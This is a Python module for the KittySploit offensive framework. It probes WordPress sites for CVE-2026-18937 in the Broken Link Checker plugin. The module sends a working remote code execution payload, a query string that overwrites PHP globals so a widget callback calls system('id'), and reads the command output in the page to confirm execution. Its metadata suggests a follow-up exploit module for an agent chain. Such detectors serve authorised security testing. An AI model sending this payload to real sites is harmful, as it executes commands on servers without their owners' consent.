#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Broken Link Checker < 2.4.12 PHP global overwrite RCE (CVE-2026-18937)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "broken-link-checker"
_VULN_HIGH = (2, 4, 11)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Broken Link Checker CVE-2026-18937 RCE detect",
        "description": (
            "Detects CVE-2026-18937 on plain permalinks: query params overwrite "
            "wp_registered_widgets callback to system and run id."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-18937",
        "references": ["https://wpscan.com/vulnerability/a23b76eb-107d-4e02-8eae-c3c5fa5b003d/"],
        "modules": ["exploits/multi/http/broken_link_checker_cve_2026_18937_rce"],
        "tags": ["web", "scanner", "wordpress", "broken-link-checker", "rce", "cve-2026-18937"],
        "agent": {
            "chain": {"suggested_followups": ["exploits/multi/http/broken_link_checker_cve_2026_18937_rce"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        qs = (
            "?_wp_sidebars_widgets[sidebar-1][]=x"
            "&wp_registered_widgets[x][callback]=array_filter"
            "&wp_registered_widgets[x][params][0]=system"
            "&wp_registered_sidebars[sidebar-1][cmd]=id"
        )
        r = self.http_request(method="GET", path=self._join("/") + qs, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        if re.search(r"uid=\d+.*gid=", body):
            self.set_info(
                severity="critical",
                reason="Broken Link Checker CVE-2026-18937 — command output in page",
                path="/",
                cve="CVE-2026-18937",
            )
            return True
        return False
